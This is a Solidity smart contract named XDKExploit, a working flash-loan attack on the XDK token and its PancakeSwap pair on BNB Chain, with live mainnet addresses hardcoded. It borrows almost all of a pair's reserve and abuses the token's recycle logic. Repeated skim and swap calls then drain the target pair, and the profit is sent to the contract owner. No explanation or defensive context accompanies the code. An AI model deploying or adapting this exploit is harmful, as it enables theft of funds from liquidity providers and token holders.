// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IXDK is IERC20 {
    function recycleColdTime() external view returns (uint40);
    function lastRecycleTime() external view returns (uint256);
    function thisRecycleBalance() external view returns (uint256);
    function thisRecycleMaxBalance() external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWBNB {
    function withdraw(uint256 wad) external;
}

contract XDKExploit {
    address constant WBNB       = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant XDK        = 0x02739BE625f7A1Cb196F42dceEe630C394DD9FAA;
    address constant XDK_BASE   = 0xD3c304697f63B279cd314F92c19cDBE5E5b1631A;
    address constant ROUTER     = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FLASH_PAIR = 0x12dAbFCe08eF59c24cdee6c488E05179Fb8D64D9;
    address constant TARGET_PAIR = 0xe3cBa5C0A8efAeDce84751aF2EFDdCf071D311a9;

    address public immutable owner;
    uint256 public flashAmount;

    constructor() {
        owner = msg.sender;
        IERC20(XDK_BASE).approve(ROUTER, type(uint256).max);
        IERC20(XDK).approve(ROUTER, type(uint256).max);
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "!owner");

        (, uint112 reserve1,) = IPancakePair(FLASH_PAIR).getReserves();
        uint256 borrowAmount = uint256(reserve1) * 99 / 100;
        IPancakePair(FLASH_PAIR).swap(
            0,
            borrowAmount,
            address(this),
            abi.encode(borrowAmount)
        );

        uint256 remaining = IERC20(XDK_BASE).balanceOf(address(this));
        if (remaining > 0) {
            address[] memory path = new address[](2);
            path[0] = XDK_BASE;
            path[1] = WBNB;
            IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                remaining, 0, path, address(this), block.timestamp
            );
        }
    }

    function pancakeCall(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        uint256 amount = abi.decode(data, (uint256));
        flashAmount = amount;

        IXDK xdk = IXDK(XDK);
        if (block.timestamp >= xdk.lastRecycleTime() + uint256(xdk.recycleColdTime())) {
            _initAttack();
        }

        while (IERC20(XDK_BASE).balanceOf(address(this)) > 0) {
            _swapXDKBaseForXDK();
        }

        uint256 maxBalance = xdk.thisRecycleMaxBalance();
        for (uint256 i = 0; i < 55; i++) {
            if (maxBalance <= xdk.thisRecycleBalance()) break;
            _drainViaSkim();
        }

        while (IERC20(XDK).balanceOf(address(this)) > 0) {
            _drainViaSwap();
        }

        uint256 repayAmount = amount * 10000 / 9975 + 1;
        IERC20(XDK_BASE).transfer(FLASH_PAIR, repayAmount);
    }

    function _initAttack() internal {
        IERC20(XDK_BASE).transfer(TARGET_PAIR, 1 ether);
        (uint112 r0, uint112 r1,) = IPancakePair(TARGET_PAIR).getReserves();
        uint256 actualIn = IERC20(XDK_BASE).balanceOf(TARGET_PAIR) - uint256(r1);
        uint256 xdkOut = (actualIn * 9975 * uint256(r0)) / (uint256(r1) * 10000 + actualIn * 9975);

        if (xdkOut > 0) {
            IPancakePair(TARGET_PAIR).swap(xdkOut, 0, address(this), "");
        }

        uint256 xdkBal = IERC20(XDK).balanceOf(address(this));
        if (xdkBal > 0) {
            IERC20(XDK).transfer(TARGET_PAIR, xdkBal);
            IPancakePair(TARGET_PAIR).skim(address(this));
        }
    }

    function _swapXDKBaseForXDK() internal {
        uint256 balance = IERC20(XDK_BASE).balanceOf(address(this));
        if (balance == 0) return;
        (uint112 r0, uint112 r1,) = IPancakePair(TARGET_PAIR).getReserves();
        if (r0 == 0 || r1 == 0) return;
        uint256 maxXDKOut = uint256(r0) / 10 - 1;
        if (maxXDKOut == 0) return;
        uint256 denominator = (uint256(r0) - maxXDKOut) * 9975;
        uint256 requiredInput = (uint256(r1) * maxXDKOut * 10000) / denominator + 1;
        uint256 sendAmount = balance < requiredInput ? balance : requiredInput;
        IERC20(XDK_BASE).transfer(TARGET_PAIR, sendAmount);
        uint256 actualIn = IERC20(XDK_BASE).balanceOf(TARGET_PAIR) - uint256(r1);
        uint256 xdkOut = (actualIn * 9975 * uint256(r0)) / (uint256(r1) * 10000 + actualIn * 9975);

        if (xdkOut > 0) {
            IPancakePair(TARGET_PAIR).swap(xdkOut, 0, address(this), "");
        }
    }

    function _drainViaSkim() internal {
        (uint112 r0,) = _getR0();
        uint256 maxSend = uint256(r0) / 10 - 1;
        uint256 balance = IERC20(XDK).balanceOf(address(this));
        if (balance == 0 || maxSend == 0) return;
        uint256 sendAmount = balance < maxSend ? balance : maxSend;
        IERC20(XDK).transfer(TARGET_PAIR, sendAmount);
        IPancakePair(TARGET_PAIR).skim(address(this));
    }

    function _drainViaSwap() internal {
        (uint112 r0,) = _getR0();
        uint256 maxSend = uint256(r0) / 10 - 1;
        uint256 balance = IERC20(XDK).balanceOf(address(this));
        if (balance == 0) return;
        if (maxSend == 0) maxSend = balance;
        uint256 sendAmount = balance < maxSend ? balance : maxSend;
        IERC20(XDK).transfer(TARGET_PAIR, sendAmount);
        (uint112 r0New, uint112 r1New) = _getReserves();
        uint256 xdkInPair = IERC20(XDK).balanceOf(TARGET_PAIR);
        if (xdkInPair <= uint256(r0New)) return;
        uint256 amountIn = xdkInPair - uint256(r0New);
        uint256 xdkBaseOut = (amountIn * 9975 * uint256(r1New)) / (uint256(r0New) * 10000 + amountIn * 9975);

        if (xdkBaseOut > 0) {
            IPancakePair(TARGET_PAIR).swap(0, xdkBaseOut, address(this), "");
        }
    }

    function _getR0() internal view returns (uint112 r0, uint112 r1) {
        (r0, r1,) = IPancakePair(TARGET_PAIR).getReserves();
    }

    function _getReserves() internal view returns (uint112 r0, uint112 r1) {
        (r0, r1,) = IPancakePair(TARGET_PAIR).getReserves();
    }

    function withdraw() external {
        require(msg.sender == owner, "!owner");
        uint256 wbnbBal = IERC20(WBNB).balanceOf(address(this));
        if (wbnbBal > 0) {
            IWBNB(WBNB).withdraw(wbnbBal);
        }
        payable(owner).transfer(address(this).balance);
    }
}
